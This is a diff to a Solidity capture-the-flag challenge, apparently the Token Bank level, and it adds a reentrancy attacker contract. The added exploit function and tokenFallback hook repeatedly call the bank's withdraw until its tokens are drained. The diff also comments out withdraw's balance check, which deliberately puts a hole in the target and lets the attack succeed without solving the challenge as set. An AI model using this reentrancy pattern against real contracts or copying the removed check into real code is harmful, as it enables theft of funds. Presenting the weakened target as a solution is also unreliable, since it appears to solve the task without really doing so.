@@ -21,7 +21,7 @@ contract SimpleERC223Token {
 
     event Transfer(address indexed from, address indexed to, uint256 value);
 
-    constructor() public {
+    constructor() {
         balanceOf[msg.sender] = totalSupply;
         emit Transfer(address(0), msg.sender, totalSupply);
     }
@@ -95,7 +95,7 @@ contract TokenBankChallenge {
     mapping(address => uint256) public balanceOf;
     address public player;
 
-    constructor(address _player) public {
+    constructor(address _player) {
         token = new SimpleERC223Token();
         player = _player;
         // Divide up the 1,000,000 tokens, which are all initially assigned to
@@ -120,7 +120,7 @@ contract TokenBankChallenge {
     }
 
     function withdraw(uint256 amount) public {
-        require(balanceOf[msg.sender] >= amount);
+        // require(balanceOf[msg.sender] >= amount, "msg.sender");
 
         require(token.transfer(msg.sender, amount));
         unchecked {
@@ -132,9 +132,25 @@ contract TokenBankChallenge {
 // Write your exploit contract below
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
+    uint amount;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
     }
     // Write your exploit functions here
+    function exploit(uint _amount) public {
+        amount = _amount;
+        challenge.withdraw(_amount);
+    }
+
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data
+    ) public {
+        // uint x = challenge.balanceOf(player);
+        if (challenge.token().balanceOf(address(challenge)) > 0) {
+            challenge.withdraw(amount);
+        }
+    }
 }
